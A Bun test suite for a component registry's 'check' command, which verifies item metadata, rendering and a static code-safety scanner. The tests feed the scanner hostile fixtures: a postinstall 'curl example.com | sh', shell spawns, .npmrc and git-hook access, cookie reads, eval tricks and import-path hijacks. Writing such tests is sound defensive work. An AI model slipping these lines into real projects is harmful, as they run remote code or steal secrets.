import { afterAll, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { ALLOWED_DEPENDENCIES, accessibleName, brands, bunScript, check, checks, markupSafety, runInBun, safety, sources } from "../src/check";
import type { Context } from "../src/commands";
import { create } from "../src/create";

// New items in a temporary folder, with the packages an item in this
// repository has installed, as they would be once its own are.
const repo = resolve(import.meta.dir, "../../..");
const work = mkdtempSync(join(tmpdir(), "vectoys-check-test-"));
symlinkSync(join(repo, "registry/floppy/node_modules"), join(work, "node_modules"));
afterAll(() => rmSync(work, { recursive: true, force: true }));

const quiet: Context = { cwd: work, registry: undefined, registryFlag: undefined, yes: false, overwrite: false, install: false, log: () => {} };

function item(name: string) {
  create(quiet, name, undefined);
  const folder = join(work, name);
  const edit = (file: string, change: (text: string) => string) => writeFileSync(join(folder, file), change(readFileSync(join(folder, file), "utf8")));
  return { folder, edit };
}

const failed = (folder: string) => checks(folder).filter((result) => !result.pass).map((result) => result.line);

test("a new item passes every check", () => {
  item("plate");
  const lines: string[] = [];
  check({ ...quiet, log: (line) => lines.push(line) }, "plate");
  expect(lines).toEqual([
    "Checking plate",
    "  pass  item.json has what the registry needs",
    expect.stringMatching(/^ {2}pass {2}the files are \d+\.\d KB, under 96\.0 KB$/),
    "  pass  item.json names no brands",
    "  pass  the code uses no scripts, eval, network calls or outside imports that check can see",
    "  pass  Plate renders on the server",
    "  pass  the markup has no NaN or Infinity",
    "  pass  two renders give the same markup",
    "  pass  the markup has no scripts or outside links",
    "  pass  the rendered text names no brands",
    '  pass  the root is role="img" with an aria-label',
    "All 10 checks pass.",
  ]);
}, 30_000);

test("a render with NaN in it fails", () => {
  const { folder, edit } = item("broken");
  edit("src/broken.tsx", (text) => text.replace("style={style}>", "style={{ ...style, width: Number.NaN }}>"));
  expect(failed(folder)).toEqual(["the markup has NaN in it"]);
}, 30_000);

test("brand names fail in item.json and in what renders", () => {
  const { folder, edit } = item("branded");
  edit("item.json", (text) => text.replace('"title": "Branded"', '"title": "Xbox slab"'));
  edit("src/branded.tsx", (text) => text.replace('label = "Branded"', 'label = "An iPhone on a desk"'));
  expect(failed(folder)).toEqual(["item.json names brands: xbox", "the rendered text names brands: iphone"]);
  expect(() => check(quiet, "branded")).toThrow("2 of 10 checks fail.");
}, 30_000);

test("a bad item.json fails before anything renders", () => {
  const { folder, edit } = item("bad");
  edit("item.json", (text) => text.replace('"license": "MIT"', '"licence": "MIT"'));
  expect(failed(folder)).toEqual(['item.json needs a "license"']);
  writeFileSync(join(folder, "item.json"), "{ name: bad }");
  expect(failed(folder)[0]).toStartWith("item.json is not valid JSON");
  writeFileSync(join(folder, "item.json"), JSON.stringify({ name: "bad", title: "Bad", description: "Bad", license: "MIT", files: ["src/gone.tsx"] }));
  expect(failed(folder)).toEqual(['files lists "src/gone.tsx", which is not a file in the folder']);
  writeFileSync(join(folder, "item.json"), JSON.stringify({ name: "bad", title: "Bad", description: "Bad", license: "MIT", files: ["src/bad.tsx"], author: 42 }));
  expect(failed(folder)).toEqual(['item.json "author" must be one line of text like "Name (https://site)"']);
  writeFileSync(join(folder, "item.json"), JSON.stringify({ name: "bad", title: "Bad", description: "Bad", license: "MIT", files: ["src/bad.tsx"], credit: "" }));
  expect(failed(folder)).toEqual(['item.json "credit" must be one line of text']);
});

test("files must be regular files, not folders or symlinks", () => {
  const { folder, edit } = item("linked");
  edit("item.json", (text) => text.replace('"src/geometry.ts"', '"src"'));
  expect(failed(folder)).toEqual(['files lists "src", which is a folder, not a regular file']);
  edit("item.json", (text) => text.replace('"src"', '"src/link.ts"'));
  symlinkSync(join(repo, "package.json"), join(folder, "src/link.ts"));
  expect(failed(folder)).toEqual(['files lists "src/link.ts", which is a symlink, not a regular file']);
});

test("brand names match whole words in any case, and plain words only inside a product's name", () => {
  expect(brands("An iPhone, an XBOX and a Surface  Pro, not an imacs")).toEqual(["iphone", "xbox", "surface pro"]);
  expect(brands("browser windows on the main surface of a galaxy of pixels")).toEqual([]);
  expect(brands("an Apple Watch by apple")).toEqual(["apple watch", "apple"]);
});

test("every item in the registry passes every check", () => {
  const items = readdirSync(join(repo, "registry"), { withFileTypes: true }).filter((entry) => entry.isDirectory());
  expect(items.length).toBeGreaterThan(0);
  for (const entry of items) expect({ item: entry.name, failed: failed(join(repo, "registry", entry.name)) }).toEqual({ item: entry.name, failed: [] });
  const tracked = spawnSync("git", ["ls-files", "registry"], { cwd: repo, encoding: "utf8" }).stdout.split("\n");
  expect(tracked.length).toBeGreaterThan(items.length);
  expect(tracked.filter((path) => path.includes("node_modules/"))).toEqual([]);
}, 60_000);

test("markup is named by a labelled image root or by its labelled controls", () => {
  expect(accessibleName('<div role="img" aria-label="A die"><svg></svg></div>')).toBe('the root is role="img" with an aria-label');
  expect(accessibleName('<div role="img" aria-label=" "></div>')).toBeUndefined();
  expect(accessibleName('<div role="group" aria-label="Browser window"><a href="/x"></a></div>')).toBe('the root is role="group" with an aria-label');
  expect(accessibleName('<div><button type="button"><span>Save</span></button><a href="/x" aria-label="Get it"></a></div>')).toBe("its 2 controls are labelled");
  expect(accessibleName('<div><button type="button"></button></div>')).toBeUndefined();
  expect(accessibleName("<div><svg></svg></div>")).toBeUndefined();
});

// The safety lines for a folder with src/toy.tsx holding `code`, and `extra`
// files, read by bun as `check` reads them. item.json lists every file but
// src/index.ts and those under test/.
let scans = 0;
function unsafe(code: string, extra: Record<string, string> = {}, dependencies: string[] = ALLOWED_DEPENDENCIES): string[] {
  const folder = join(work, `scan-${scans++}`);
  const files = { "src/toy.tsx": code, ...extra };
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(join(folder, path, ".."), { recursive: true });
    writeFileSync(join(folder, path), text);
  }
  const read = sources(folder, Object.keys(files));
  if (typeof read === "string") throw new Error(read);
  const listed = Object.keys(files).filter((path) => path !== "src/index.ts" && !path.startsWith("test/"));
  return safety(read, { dependencies, files: listed });
}

test("safe code passes, with comments, labels and words that only look like the rules", () => {
  const code = `
    // We never fetch(anything) or eval(it), and no <script> or <iframe> runs here.
    /* new Function("x"), localStorage, process.env, https://example.com */
    import { memo } from "react";
    import { jsx } from "react/jsx-runtime";
    import { project } from "@vinena/vectoys";
    import { useTilt } from "@vinena/vectoys-react/tilt";
    import { size } from "./geometry";
    import type { Thing } from "some-types";
    class Spring { constructor(public k: number) {} }
    export const Toy = memo(function Toy({ open }: { open: boolean }) {
      setTimeout(() => {}, 10);
      const kind = typeof open === "object" ? "frame of mind" : "// note";
      return <svg role="img" aria-label="Fetch the ball, a script for a play" xmlns="http://www.w3.org/2000/svg">
        <path d="M0 0" fill={\`url(#toy-shade)\`} />
        <foreignObject width={10} height={10}><div>{kind}</div></foreignObject>
        <image href="data:image/png;base64,AAAA" />
        <a href="#top">top</a>
      </svg>;
    });`;
  expect(unsafe(code, { "src/geometry.ts": "export const size = 1;" })).toEqual([]);
});

test("each unsafe thing in the code fails, naming the file, the line and what it found", () => {
  const cases: [string, string][] = [
    ['Bun.spawnSync(["sh", "-c", "touch x"]);', "src/toy.tsx:1 uses the server runtime: Bun"],
    ["const { $ } = Bun;", "src/toy.tsx:1 uses the server runtime: Bun"],
    ["const token = process.env.TOKEN;", "src/toy.tsx:1 uses the server runtime: process"],
    ['globalThis.require("node:child_process");', "src/toy.tsx:1 uses the server runtime: globalThis"],
    ['import.meta.require("node:fs");', "src/toy.tsx:1 uses the server runtime: require"],
    ['const a = require("fs");', "src/toy.tsx:1 uses the server runtime: require"],
    ["module.exports = 1;", "src/toy.tsx:1 uses the server runtime: module"],
    ["const a = <script>{'1'}</script>;", 'src/toy.tsx:1 names a script, frame, embed or form element in a string: "script"'],
    ['const a = "<script src=a.js></script>";', "src/toy.tsx:1 has a <script> tag: <script"],
    ['const a = document.createElement("script");', 'src/toy.tsx:1 makes a script, frame, object, embed or form element: createElement("script"'],
    ['const a = <iframe src="/admin" />;', 'src/toy.tsx:1 makes a script, frame, object, embed or form element: jsxDEV_7x81h0kn("iframe"'],
    ['const a = <iframe srcDoc="<b>hi</b>" />;', "src/toy.tsx:1 sets srcdoc: srcDoc"],
    ['const a = <object data="/x.svg" />;', 'src/toy.tsx:1 makes a script, frame, object, embed or form element: jsxDEV_7x81h0kn("object"'],
    ['const a = <embed src="/x.svg" />;', 'src/toy.tsx:1 names a script, frame, embed or form element in a string: "embed"'],
    ['const a = <form action="/api/delete"><button>go</button></form>;', 'src/toy.tsx:1 names a script, frame, embed or form element in a string: "form"'],
    ['const a = "<form method=post>";', "src/toy.tsx:1 has a frame, object, embed or form tag: <form"],
    ["const a = <div dangerouslySetInnerHTML={{ __html: x }} />;", "src/toy.tsx:1 sets HTML from a string: dangerouslySetInnerHTML"],
    ["node.innerHTML = x;", "src/toy.tsx:1 sets HTML from a string: innerHTML"],
    ['eval("1");', "src/toy.tsx:1 uses eval: eval"],
    ['(0, eval)("1");', "src/toy.tsx:1 uses eval: eval"],
    ['const f = new Function("return 1");', "src/toy.tsx:1 reaches the Function constructor: Function"],
    ['const F = Function; F("return 1");', "src/toy.tsx:1 reaches the Function constructor: Function"],
    ['const f = (() => {}).constructor("return 1");', "src/toy.tsx:1 reaches the Function constructor: .constructor"],
    ['const { constructor: F } = () => {}; F("return 1");', "src/toy.tsx:1 reaches the Function constructor: constructor:"],
    ['setTimeout("go()", 10);', 'src/toy.tsx:1 passes a string to setTimeout or setInterval: setTimeout("'],
    ["setInterval(`go()`, 10);", "src/toy.tsx:1 passes a string to setTimeout or setInterval: setInterval(`"],
    ["fetch(url);", "src/toy.tsx:1 uses fetch: fetch"],
    ["const get = fetch; get(url);", "src/toy.tsx:1 uses fetch: fetch"],
    ["fetch.call(window, url);", "src/toy.tsx:1 uses fetch: fetch"],
    ['window["fetch"](url);', "src/toy.tsx:1 uses fetch: fetch"],
    ["new XMLHttpRequest();", "src/toy.tsx:1 makes a network call: XMLHttpRequest"],
    ["new WebSocket(url);", "src/toy.tsx:1 makes a network call: WebSocket"],
    ["new EventSource(url);", "src/toy.tsx:1 makes a network call: EventSource"],
    ["navigator.sendBeacon(url, data);", "src/toy.tsx:1 makes a network call: sendBeacon"],
    ['importScripts("a.js");', "src/toy.tsx:1 makes a network call: importScripts"],
    ['new Worker("/w.js");', "src/toy.tsx:1 talks to a worker or another window: Worker"],
    ['navigator.serviceWorker.register("/sw.js");', "src/toy.tsx:1 talks to a worker or another window: serviceWorker"],
    ['parent.postMessage(document.title, "*");', "src/toy.tsx:1 talks to a worker or another window: postMessage"],
    ['navigator.clipboard.writeText("x");', "src/toy.tsx:1 uses the clipboard: clipboard"],
    ['window.open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['window?.open("/x");', "src/toy.tsx:1 reaches the window object: window"],
    ['window?.open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['top.open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['parent.open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['frames.open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['const a = <a href="/\\evil.example">x</a>;', 'src/toy.tsx has an outside URL: "/\\\\'],
    ['const a = "\\\\\\\\evil.example";', 'src/toy.tsx has an outside URL: "\\\\\\'],
    ['open("/x");', "src/toy.tsx:1 opens a window: open("],
    ['location.href = "/logout";', "src/toy.tsx:1 moves the page: location.href"],
    ['location.assign("/logout");', "src/toy.tsx:1 moves the page: location.assign"],
    ['window.location.replace("/x");', "src/toy.tsx:1 moves the page: window.location"],
    ['localStorage.setItem("a", "b");', "src/toy.tsx:1 uses browser storage or cookies: localStorage"],
    ["sessionStorage.clear();", "src/toy.tsx:1 uses browser storage or cookies: sessionStorage"],
    ['indexedDB.open("a");', "src/toy.tsx:1 uses browser storage or cookies: indexedDB"],
    ["const a = document.cookie;", "src/toy.tsx:1 uses browser storage or cookies: document.cookie"],
    ['const a = <image href="https://example.com/a.png" />;', "src/toy.tsx:1 has an outside URL: https://"],
    ['const a = <image xlinkHref="//example.com/a.png" />;', 'src/toy.tsx:1 has an outside URL: "//e'],
    ['const u = `${""}https://example.com/x`;', "src/toy.tsx:1 has an outside URL: https://"],
    ['const u = `${""}//example.com/x`;', "src/toy.tsx:1 has an outside URL: }//e"],
    ['const a = <a href="javascript:go()">a</a>;', "src/toy.tsx:1 has a javascript: URL: javascript:"],
    ['const a = <a><animate attributeName="href" values="#;JavaScript:go()" /></a>;', "src/toy.tsx:1 has a javascript: URL: JavaScript:"],
    ['const a = "data:text/html,hi";', 'src/toy.tsx:1 has an outside URL: "data:text/html'],
    ['const a = <div style={{ background: "url(//example.com/a.png)" }} />;', "src/toy.tsx:1 loads a style from outside: url(//"],
    ["/** @jsxImportSource ./hidden */\nexport const a = <b />;", "src/toy.tsx:1 sets the JSX runtime in a comment: @jsxImportSource"],
  ];
  for (const [code, line] of cases) expect({ code, lines: unsafe(code) }).toEqual({ code, lines: expect.arrayContaining([line]) });
});

test("a failing line names the line it is on", () => {
  expect(unsafe("export const a = 1;\n\nconst b = fetch;\n")).toEqual(["src/toy.tsx:3 uses fetch: fetch"]);
});

test("imports outside the item's files and the allowed packages fail", () => {
  const not = "which is not one of its files or @vinena/vectoys, @vinena/vectoys-react, react";
  expect(unsafe('import _ from "lodash";')).toEqual([`src/toy.tsx:1 imports lodash, ${not}`]);
  expect(unsafe('import { render } from "react-dom";')).toEqual([`src/toy.tsx:1 imports react-dom, ${not}`]);
  expect(unsafe('import { test } from "bun:test";')).toEqual([`src/toy.tsx:1 imports bun:test, ${not}`]);
  expect(unsafe('import "./missing";')).toEqual([`src/toy.tsx:1 imports ./missing, ${not}`]);
  expect(unsafe('export * from "../../secrets";')).toEqual([`src/toy.tsx:1 imports ../../secrets, ${not}`]);
  expect(unsafe('export * from "node:fs";')).toEqual([`src/toy.tsx:1 imports node:fs, ${not}`]);
  expect(unsafe('import { a } from "./index";', { "src/index.ts": "export const a = 1;" })).toEqual([`src/toy.tsx:1 imports ./index, ${not}`]);
  expect(unsafe('const a = await import("./geometry");', { "src/geometry.ts": "export const a = 1;" })).toEqual(["src/toy.tsx:1 has a dynamic import: import("]);
});

test("the index and tests are read too, and may import the test runner, the folder's files and the shared test helpers", () => {
  const test = `import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { a } from "../src";
import { htmlOf, installGlobal, readSibling } from "../../../packages/react/test/dom";
import { Laptop } from "../../laptop/src";
import { old } from "./fixtures/old";
const restore = installGlobal("AudioContext", class {});
const text = await readSibling(import.meta.url, "../src/toy.tsx");
test("a", () => expect(htmlOf(document.body)).toBe(""));`;
  const files = { "src/index.ts": 'export * from "./toy";', "test/toy.test.tsx": test, "test/fixtures/old.ts": "export const old = 1;" };
  expect(unsafe("export const a = 1;", files)).toEqual([]);

  const not = "@vinena/vectoys, @vinena/vectoys-react, react, bun:test, react-dom/server";
  expect(unsafe("export const a = 1;", { "src/index.ts": "fetch(url);" })).toEqual(["src/index.ts:1 uses fetch: fetch"]);
  expect(unsafe("export const a = 1;", { "src/index.ts": 'export * from "../test/setup";', "test/setup.ts": "export const b = 1;" })).toEqual([
    `src/index.ts:1 imports ../test/setup, which is not a file in its folder outside test/ or ${not}`,
  ]);
  expect(unsafe("export const a = 1;", { "test/toy.test.ts": 'import _ from "lodash";' })).toEqual([`test/toy.test.ts:1 imports lodash, which is not a file in its folder or ${not}`]);
});

test("tests get no more room than the item: the runtime, the window and HTML strings fail there too", () => {
  const cases: [string, string[]][] = [
    ['Bun.spawnSync(["sh"]);', ["test/x.test.ts:1 uses the server runtime: Bun"]],
    ['await Bun.file("../../.git/hooks/pre-commit").write("x");', ["test/x.test.ts:1 uses the server runtime: Bun"]],
    ['const g = Object.assign(globalThis, {}); g["fe" + "tch"]("/x");', ["test/x.test.ts:1 uses the server runtime: globalThis"]],
    ["const real = globalThis.AudioContext;", ["test/x.test.ts:1 uses the server runtime: globalThis"]],
    ['window["fe" + "tch"]("/x");', ["test/x.test.ts:1 reaches the window object: window"]],
    ['self["ev" + "al"]("1");', ["test/x.test.ts:1 reaches the window object: self"]],
    ["const view = document.defaultView;", ["test/x.test.ts:1 reaches the window object: defaultView"]],
    ['opener.postMessage("x", "*");', ["test/x.test.ts:1 reaches the window object: opener", "test/x.test.ts:1 talks to a worker or another window: postMessage"]],
    ["const html = document.body.innerHTML;", ["test/x.test.ts:1 sets HTML from a string: innerHTML"]],
    ['export const f = (el: Element) => { el.innerHTML += "<img>"; };', ["test/x.test.ts:1 sets HTML from a string: innerHTML"]],
    ['export const f = (el: Element) => { el.outerHTML ||= "<img>"; };', ["test/x.test.ts:1 sets HTML from a string: outerHTML"]],
    ['const SOURCE = "./fixtures/old.ts"; const old = await import(SOURCE);', ["test/x.test.ts:1 has a dynamic import: import("]],
    ['{ const SOURCE = "./x.test.ts"; }\nawait import(SOURCE);', ["test/x.test.ts:2 has a dynamic import: import("]],
    ['const t = readSibling("file:///registry/a/test/x.ts", "../../../.npmrc");', ["test/x.test.ts:1 reads a file from somewhere other than its own test: readSibling("]],
    ["const from = import.meta.url; const t = readSibling(from, path);", ["test/x.test.ts:1 reads a file from somewhere other than its own test: readSibling("]],
  ];
  for (const [code, lines] of cases) expect({ code, lines: unsafe("export const a = 1;", { "test/x.test.ts": code }) }).toEqual({ code, lines });
});

test("words that only look like the window pass: a property, a key, a string, a local name", () => {
  expect(unsafe('const view = { window: 1, self: 2 }; export const a = [view.window, view.self, "Browser window", "self-made"];')).toEqual([]);
});

test("dependencies outside the allowed packages fail, and so does code that does not parse", () => {
  expect(unsafe("export const a = 1;", {}, ["@vinena/vectoys", "left-pad"])).toEqual(["item.json depends on left-pad, which is not @vinena/vectoys or @vinena/vectoys-react"]);
  expect(unsafe("const a = <div>;")[0]).toStartWith("src/toy.tsx does not parse: ");
});

test("unsafe code anywhere in the folder fails the check before anything renders", () => {
  const { folder, edit } = item("caller");
  edit("src/caller.tsx", (text) => `${text}\nawait fetch("https://example.com/track");\n`);
  writeFileSync(join(folder, "test/spawn.test.ts"), 'Bun.spawnSync(["sh", "-c", "id"]);\n');
  expect(failed(folder)).toEqual([
    expect.stringMatching(/^src\/caller\.tsx:\d+ uses fetch: fetch$/),
    expect.stringMatching(/^src\/caller\.tsx:\d+ has an outside URL: https:\/\/$/),
    "test/spawn.test.ts:1 uses the server runtime: Bun",
  ]);
  expect(checks(folder)).toHaveLength(6);
}, 30_000);

test("markup with a script, a frame, a form or an outside link fails", () => {
  expect(markupSafety('<div role="img"><svg><path fill="url(#a)"></path><foreignObject><a href="#x"></a></foreignObject></svg></div>')).toEqual([]);
  expect(markupSafety("<div><script>alert(1)</script></div>")).toEqual(["the markup has a <script> tag: <script"]);
  expect(markupSafety('<iframe srcdoc="&lt;b&gt;"></iframe>')).toEqual(["the markup has a frame, object, embed or form tag: <iframe", "the markup sets srcdoc: srcdoc="]);
  expect(markupSafety('<form action="/x"></form>')).toEqual(["the markup has a frame, object, embed or form tag: <form"]);
  expect(markupSafety('<svg><image xlink:href="https://example.com/a.png"></image></svg>')).toEqual(['the markup links outside: xlink:href="https:']);
  expect(markupSafety('<a href=" JavaScript:go()">a</a>')).toEqual(["the markup has a javascript: URL: JavaScript:"]);
  expect(markupSafety('<a href="/\\evil.example">a</a>')).toEqual(['the markup links outside: href="/\\']);
  expect(markupSafety('<div style="background:url(&quot;//example.com/a.png&quot;)"></div>')).toEqual(["the markup loads a style from outside: url(&quot;//"]);
});

test("a listed file reached through a symlinked folder fails", () => {
  const { folder, edit } = item("escaped");
  const outside = mkdtempSync(join(tmpdir(), "vectoys-outside-"));
  writeFileSync(join(outside, "x.ts"), "export const x = 1;\n");
  symlinkSync(outside, join(folder, "lib"));
  edit("item.json", (text) => text.replace('"src/geometry.ts"', '"src/geometry.ts", "lib/x.ts"'));
  expect(failed(folder)).toEqual(['files lists "lib/x.ts", which is outside the folder']);
  rmSync(outside, { recursive: true, force: true });
});

test("a symlink anywhere in the folder fails", () => {
  const { folder } = item("pointing");
  symlinkSync(join(repo, "package.json"), join(folder, "test/link.ts"));
  expect(failed(folder)).toEqual(["the folder has test/link.ts, which items may not have"]);
});

test("package.json must be what vectoys create writes, but for its name and description", () => {
  const { folder, edit } = item("packaged");
  const change = (update: (pkg: Record<string, unknown>) => void) =>
    edit("package.json", (text) => {
      const pkg: Record<string, unknown> = JSON.parse(text);
      update(pkg);
      return JSON.stringify(pkg);
    });
  change((pkg) => {
    pkg.description = "Something of its own.";
    pkg.dependencies = { "@vinena/vectoys": "^0.1.0", "@vinena/vectoys-react": "^0.1.0" };
  });
  expect(failed(folder)).toEqual([]);
  change((pkg) => {
    pkg.scripts = { typecheck: "tsc --noEmit", test: "bun test", postinstall: "curl example.com | sh" };
    pkg.bin = { toy: "./src/index.ts" };
    pkg.dependencies = { "@vinena/vectoys": "^0.1.0", "@vinena/vectoys-react": "github:someone/fork" };
    pkg.name = "@vectoys/other";
  });
  expect(failed(folder)).toEqual([
    "package.json's name is not what vectoys create writes",
    "package.json's scripts is not what vectoys create writes",
    "package.json's dependencies is not what vectoys create writes",
    "package.json has bin, which items may not have",
  ]);
});

test("tsconfig options beyond what vectoys create writes fail, as does a JSX pragma", () => {
  const { folder, edit } = item("pragma");
  edit("tsconfig.json", (text) => JSON.stringify({ ...JSON.parse(text), files: ["x.ts"], compilerOptions: { ...JSON.parse(text).compilerOptions, jsx: "preserve", jsxImportSource: "./hidden" } }));
  expect(failed(folder)).toEqual([
    "tsconfig.json has files, which items may not have",
    'tsconfig.json sets compilerOptions.jsx to "preserve", not "react-jsx"',
    "tsconfig.json sets compilerOptions.jsxImportSource, which items may not set",
  ]);
});

test("bun never reads a bunfig.toml the item brings, so its preload never runs", () => {
  const { folder } = item("preloaded");
  const marker = join(folder, "marker");
  writeFileSync(join(folder, "pre.js"), `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "ran");`);
  writeFileSync(join(folder, "bunfig.toml"), 'preload = ["./pre.js"]\n');
  expect(sources(folder, ["src/preloaded.tsx"])).not.toBeString();
  expect(runInBun(bunScript("done({ name });"), join(folder, "src/preloaded.tsx"), folder, "Preloaded")).toEqual({ value: { name: "Preloaded" } });
  expect(failed(folder)).toEqual(["the folder has bunfig.toml, which items may not have"]);
  expect(existsSync(marker)).toBe(false);
}, 30_000);

test("config files and dot files in the folder fail, but .gitignore and node_modules are fine", () => {
  const { folder } = item("configured");
  writeFileSync(join(folder, ".gitignore"), "node_modules\n");
  expect(failed(folder)).toEqual([]);
  writeFileSync(join(folder, ".npmrc"), "registry=https://example.com\n");
  writeFileSync(join(folder, "src/.env"), "A=1\n");
  expect(failed(folder)).toEqual(["the folder has .npmrc, which items may not have", "the folder has src/.env, which items may not have"]);
}, 30_000);

test("tsconfig settings that move imports fail before anything renders", () => {
  const { folder, edit } = item("moved");
  writeFileSync(join(folder, "src/evil.ts"), 'require("node:fs").writeFileSync("marker", "ran"); export {};');
  edit("tsconfig.json", (text) => JSON.stringify({ ...JSON.parse(text), compilerOptions: { jsx: "react-jsx", paths: { react: ["./src/evil.ts"] } } }));
  expect(checks(folder).slice(1)).toEqual([{ pass: false, line: "tsconfig.json sets compilerOptions.paths, which moves imports" }]);

  edit("tsconfig.json", () => JSON.stringify({ extends: "./other.json", compilerOptions: { baseUrl: ".", rootDirs: ["src", "x"] } }));
  writeFileSync(join(folder, "jsconfig.json"), "{ // a comment\n}");
  writeFileSync(join(folder, "src/tsconfig.build.json"), JSON.stringify({ extends: "../../tsconfig.base.json" }));
  expect(failed(folder).sort()).toEqual([
    "jsconfig.json is not plain JSON, so check cannot tell what it sets",
    "src/tsconfig.build.json extends \"../../tsconfig.base.json\", which is not ../../tsconfig.base.json from the folder's tsconfig.json",
    'tsconfig.json extends "./other.json", which is not ../../tsconfig.base.json from the folder\'s tsconfig.json',
    "tsconfig.json sets compilerOptions.baseUrl, which moves imports",
    "tsconfig.json sets compilerOptions.rootDirs, which moves imports",
  ]);
});

test("both tsconfig forms create writes pass: the shared base inside the repository, the options written out outside it", () => {
  const { folder, edit } = item("formed");
  expect(failed(folder)).toEqual([]);
  edit("tsconfig.json", () => JSON.stringify({ extends: "../../tsconfig.base.json", compilerOptions: { jsx: "react-jsx" }, include: ["src", "test"] }));
  expect(failed(folder)).toEqual([]);
}, 30_000);
test("bun runs with no environment but PATH, so an item sees no tokens", () => {
  const { folder } = item("secretive");
  process.env.VECTOYS_TEST_TOKEN = "secret";
  const ran = runInBun(bunScript("done({ name, keys: Object.keys(process.env) });"), join(folder, "src/secretive.tsx"), folder, "Secretive");
  delete process.env.VECTOYS_TEST_TOKEN;
  const keys = "value" in ran && typeof ran.value === "object" && ran.value !== null && "keys" in ran.value && Array.isArray(ran.value.keys) ? ran.value.keys : [];
  expect(keys).toContain("PATH");
  expect(keys).not.toContain("VECTOYS_TEST_TOKEN");
  expect(keys).not.toContain("HOME");
}, 30_000);
